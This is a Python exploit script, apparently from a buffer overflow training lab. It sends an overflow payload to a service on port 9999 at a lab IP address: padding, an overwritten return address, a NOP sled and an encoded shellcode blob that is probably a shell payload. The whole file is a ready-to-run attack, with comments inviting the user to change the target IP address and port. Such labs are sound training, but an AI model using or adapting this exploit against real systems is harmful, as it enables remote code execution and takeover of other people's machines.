import socket, sys, time


ip = '10.0.2.57'	# Change this
port = 9999		# Change this

buffer = b'A' * 524
retn = b'\xf3\x12\x17\x31'
padding = b'\x90' * 16
shellcode =  b""
shellcode += b"\xbf\xd3\xec\xa3\x26\xdb\xc0\xd9\x74\x24\xf4"
shellcode += b"\x5a\x2b\xc9\xb1\x31\x31\x7a\x13\x03\x7a\x13"
shellcode += b"\x83\xea\x2f\x0e\x56\xda\x27\x4d\x99\x23\xb7"
shellcode += b"\x32\x13\xc6\x86\x72\x47\x82\xb8\x42\x03\xc6"
shellcode += b"\x34\x28\x41\xf3\xcf\x5c\x4e\xf4\x78\xea\xa8"
shellcode += b"\x3b\x79\x47\x88\x5a\xf9\x9a\xdd\xbc\xc0\x54"
shellcode += b"\x10\xbc\x05\x88\xd9\xec\xde\xc6\x4c\x01\x6b"
shellcode += b"\x92\x4c\xaa\x27\x32\xd5\x4f\xff\x35\xf4\xc1"
shellcode += b"\x74\x6c\xd6\xe0\x59\x04\x5f\xfb\xbe\x21\x29"
shellcode += b"\x70\x74\xdd\xa8\x50\x45\x1e\x06\x9d\x6a\xed"
shellcode += b"\x56\xd9\x4c\x0e\x2d\x13\xaf\xb3\x36\xe0\xd2"
shellcode += b"\x6f\xb2\xf3\x74\xfb\x64\xd8\x85\x28\xf2\xab"
shellcode += b"\x89\x85\x70\xf3\x8d\x18\x54\x8f\xa9\x91\x5b"
shellcode += b"\x40\x38\xe1\x7f\x44\x61\xb1\x1e\xdd\xcf\x14"
shellcode += b"\x1e\x3d\xb0\xc9\xba\x35\x5c\x1d\xb7\x17\x0a"
shellcode += b"\xe0\x45\x22\x78\xe2\x55\x2d\x2c\x8b\x64\xa6"
shellcode += b"\xa3\xcc\x78\x6d\x80\x23\x33\x2c\xa0\xab\x9a"
shellcode += b"\xa4\xf1\xb1\x1c\x13\x35\xcc\x9e\x96\xc5\x2b"
shellcode += b"\xbe\xd2\xc0\x70\x78\x0e\xb8\xe9\xed\x30\x6f"
shellcode += b"\x09\x24\x53\xee\x99\xa4\xba\x95\x19\x4e\xc3"






payload = buffer + retn + padding + shellcode

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.connect((ip, port))
        #s.recv(1024)
        print('Sending payload')
        s.send(payload)
        s.recv(1024)
except Exception as e:
    print(e)
    sys.exit(0)
